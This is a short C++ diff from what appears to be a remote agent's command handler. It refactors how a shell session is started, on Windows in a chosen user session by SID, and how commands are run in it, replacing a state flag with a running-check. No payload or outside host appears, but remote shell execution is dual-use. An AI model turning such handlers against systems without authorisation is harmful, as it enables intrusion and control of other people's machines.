@@ -68,29 +68,19 @@ std::string CommandHandler::onStartShell(const Document& req)
         }
     }
 
-    if (shellRunning_) {
-        if (utils::iequals(shell_->get_current_sid(), sid)) {
-			DARKSCRY_LOG("Shell session already running for SID: " + win32::narrow(sid), Logger::Level::Debug);
-			return makeSuccess(Value(rapidjson::kNullType));
-        }
-
-        shell_->stop();
-        shellRunning_ = false;
-    }
-
-    shellRunning_ = shell_->create_by_sid(sid);
+    bool created = shell_->create_by_sid(sid);
+    DARKSCRY_LOG("Shell session initiated for SID: " + win32::narrow(sid) + (created ? " true" : " false"), Logger::Level::Debug);
 #else
-    if (!shellRunning_)
-        shellRunning_ = shell_->create();
+    bool created = shell_->create();
+    DARKSCRY_LOG(std::string("Shell session initiated ") + (created ? "true" : "false"), Logger::Level::Debug);
 #endif
-    DARKSCRY_LOG("Shell session initiated for SID: " + win32::narrow(sid) + (shellRunning_ ? " true" : " false"), Logger::Level::Debug);
-    return shellRunning_ ? makeSuccess(Value(rapidjson::kNullType))
-                         : makeError("Shell start failed");
+    return created ? makeSuccess(Value(rapidjson::kNullType))
+                   : makeError("Shell start failed");
 }
 
 std::string CommandHandler::onRunCommand(const Document& req)
 {
-    if (!shellRunning_)
+    if (!shell_ || !shell_->is_running())
         return makeError("Shell not running");
 
     std::string cmd;
